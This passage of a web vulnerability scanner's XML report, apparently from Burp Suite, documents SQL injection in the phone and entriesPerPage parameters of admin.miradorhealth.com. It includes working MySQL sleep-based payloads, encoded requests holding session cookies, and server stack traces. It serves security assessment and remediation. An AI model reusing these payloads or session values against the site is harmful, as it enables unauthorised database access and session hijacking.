at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue>https://admin.miradorhealth.com/UserProfile/399?edvurh8xhx=edvurh8xhx%27%22`&apos;&quot;/edvurh8xhx/&gt;&lt;edvurh8xhx/\&gt;bg1nj9sv0c&amp;#edvurh8xhx=edvurh8xhx%27%22`&apos;&quot;/edvurh8xhx/&gt;&lt;edvurh8xhx/\&gt;bg1nj9sv0c&amp;</sourceValue>
      <sinkValue>https://admin.miradorhealth.com/UserProfile/399?edvurh8xhx=edvurh8xhx%27%22`&apos;&quot;/edvurh8xhx/&gt;&lt;edvurh8xhx/\&gt;bg1nj9sv0c&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId>editProfile</eventFiredElementId>
      <eventFiredElementName>editProfile</eventFiredElementName>
      <eventFiredOuterHtml>&lt;button type=&quot;button&quot; id=&quot;editProfile&quot; value=&quot;Edit&quot; class=&quot;btn btn-dark&quot; name=&quot;editProfile&quot; onclick=</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>6069029016088883200</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399 [phone parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li><li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li><li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>phone</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the phone parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the phone parameter. The application took <b>20074</b> milliseconds to respond to the request, compared with <b>98</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPVp6QjNqWDdIWGdob3A0MjBwNS9WV3hJNlV1YXY1MjBndXhNSkRyaml2eGxHdVduN3VtU1dFclE0d3RTMzRtZGFuUjd1ZkdEZlZ3MHN1WjY5UDBTMWtFMzFwU1cwYTdVeWhnWmJSb3YvSWsyQ1BkR21sZEhEMEFTblhkazI7IEFXU0FMQkNPUlM9WnpCM2pYN0hYZ2hvcDQyMHA1L1ZXeEk2VXVhdjUyMGd1eE1KRHJqaXZ4bEd1V243dW1TV0VyUTR3dFMzNG1kYW5SN3VmR0RmVncwc3VaNjlQMFMxa0UzMXBTVzBhN1V5aGdaYlJvdi9JazJDUGRHbWxkSEQwQVNuWGRrMg0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCcmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MjoxNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODc3DQpTZXQtQ29va2llOiBBV1NBTEI9RVZaNEZQRDB3ZGVJMnlJWDhPckdXRWxUcU1idCtKR2dmR1RCN1FhWGRyMFE0S3FkaFJ6ZE1Yc3pmVmlrZUhHaXpIb1hpNEN2QmdTOGpLTmRZa3M4VXVmYzFVbDcvUmNLOXAvQnZtaXgwOTBSOGpKRUhWQnVCcXVHV2N4ejsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUyOjE1IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUVWWjRGUEQwd2RlSTJ5SVg4T3JHV0VsVHFNYnQrSkdnZkdUQjdRYVhkcjBRNEtxZGhSemRNWHN6ZlZpa2VIR2l6SG9YaTRDdkJnUzhqS05kWWtzOFV1ZmMxVWw3L1JjSzlwL0J2bWl4MDkwUjhqSkVIVkJ1QnF1R1djeHo7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MjoxNSBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnMzk5LnBuZycsIHVzZXJfdHlwZV9pZD0xLCBlbnRyaWVzX3Blcl9wYWdlPTUwLCB0aW1lem9uZT0nJywgaXNfZGVsZXRlZD0wLCBpc19hY3QnIGF0IGxpbmUgMSBpbiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDozMgpTdGFjayB0cmFjZToKIzAgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHAoMzIpOiBteXNxbGktJmd0O3F1ZXJ5KCd1cGRhdGUgdXNlciBzZXQuLi4nKQojMSAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL21vZGVscy9Vc2VyLnBocCg0MzkpOiBEYlV0aWw6Omluc2VydFJlY29yZChPYmplY3QobXlzcWxpKSwgJ3VwZGF0ZSB1c2VyIHNldC4uLicpCiMyIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vY29udHJvbGxlci9Vc2VyUHJvZmlsZUNvbnRyb2xsZXIucGhwKDEyNSk6IFVzZXItJmd0O3NhdmUoKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJzM5OScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjMyPC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPTRPZndZMnUrMmxaajQ3dm0reGRHSEMwZzEzMUdYMGlBTGFYZ2REdjd5OUp3NjFXYWp6UEFCb0pxcnNWYUZtTnluMGFTS1MvMGlUK2h6dk43dmdrWEJ1WTlmRUZIMzVOK3pTazE5NDRkL2cxNFY2L1RPOXVOd0Y2UmpDREo7IEFXU0FMQkNPUlM9NE9md1kydSsybFpqNDd2bSt4ZEdIQzBnMTMxR1gwaUFMYVhnZER2N3k5Snc2MVdhanpQQUJvSnFyc1ZhRm1OeW4wYVNLUy8waVQraHp2Tjd2Z2tYQnVZOWZFRkgzNU4relNrMTk0NGQvZzE0VjYvVE85dU53RjZSakNESg0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCcnJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MjoxNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzANClNldC1Db29raWU6IEFXU0FMQj03Ylp3RmhhV2oxR2hQUW56QkN5VzFBaEJMRzBkOXk5a2tWOWJvaUlIUHlVWStmaVdOL1RGano3c1N1emJkdHhzdjlXbFRrRGhqQjBUSldXaEU4dXVqcmRBcEx0V0NJZ2RuMDY3N0kraGl6NHRnWGFRbUZwS1ljYU4rdldnOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTI6MTUgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9N2Jad0ZoYVdqMUdoUFFuekJDeVcxQWhCTEcwZDl5OWtrVjlib2lJSFB5VVkrZmlXTi9URmp6N3NTdXpiZHR4c3Y5V2xUa0RoakIwVEpXV2hFOHV1anJkQXBMdFdDSWdkbjA2NzdJK2hpejR0Z1hhUW1GcEtZY2FOK3ZXZzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUyOjE1IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiU1VDQ0VTUyJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPTh1WXlDb014NkpHNVU5MHZrMXFEdUdham50ck9Ub1JPK2djbVdJUktBdmRXR0ZOaWRLbVp2aEFaNUo2SGt5NHpWdlowWUIrTWpKc2tUYUtwb1BKb29Cd3krWWEybHNuM2ZXMmE2dzlYUDdKNS90ME9heXNQZTUvSXU2azI7IEFXU0FMQkNPUlM9OHVZeUNvTXg2Skc1VTkwdmsxcUR1R2FqbnRyT1RvUk8rZ2NtV0lSS0F2ZFdHRk5pZEttWnZoQVo1SjZIa3k0elZ2WjBZQitNakpza1RhS3BvUEpvb0J3eStZYTJsc24zZlcyYTZ3OVhQN0o1L3QwT2F5c1BlNS9JdTZrMg0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmInJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MjozNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzANClNldC1Db29raWU6IEFXU0FMQj1KR2VscHcySEVROEdjeG1zSUhjdjlKM2NKRnJJQnkzY3NIT0VWOW9kVEUxRkJaZDQweWZoWXpjRnpXM0hTZDk5dDQxY2c2a29WM1ZtcnREQ0dGdHphSVRyOWNaSGtaMmtXNG1laTcxVWJzbk8zWk1ka0tBWjViMS9TSU1QOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTI6MTUgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9SkdlbHB3MkhFUThHY3htc0lIY3Y5SjNjSkZySUJ5M2NzSE9FVjlvZFRFMUZCWmQ0MHlmaFl6Y0Z6VzNIU2Q5OXQ0MWNnNmtvVjNWbXJ0RENHRnR6YUlUcjljWkhrWjJrVzRtZWk3MVVic25PM1pNZGtLQVo1YjEvU0lNUDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUyOjE1IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiU1VDQ0VTUyJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8382149579608364032</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399 [entriesPerPage parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li><li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li><li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>entriesPerPage</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the entriesPerPage parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the entriesPerPage parameter. The application took <b>20109</b> milliseconds to respond to the request, compared with <b>98</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPWYxVWRKSzdDMndqN2tmSUM0NlRzTzRZRGltRURjVGltS01vU0dxNW1VUjVibjFvWnZkM28zODNnaTlmbXJQT09aV2gwL3lkWmhRQXhYZnFKYTdac3lsVEJoSmlOU0g5UitEWTVnbmVWM25pYmMwdkIwdmthVlRlTldhang7IEFXU0FMQkNPUlM9ZjFVZEpLN0Myd2o3a2ZJQzQ2VHNPNFlEaW1FRGNUaW1LTW9TR3E1bVVSNWJuMW9admQzbzM4M2dpOWZtclBPT1pXaDAveWRaaFFBeFhmcUphN1pzeWxUQmhKaU5TSDlSK0RZNWduZVYzbmliYzB2QjB2a2FWVGVOV2FqeA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogY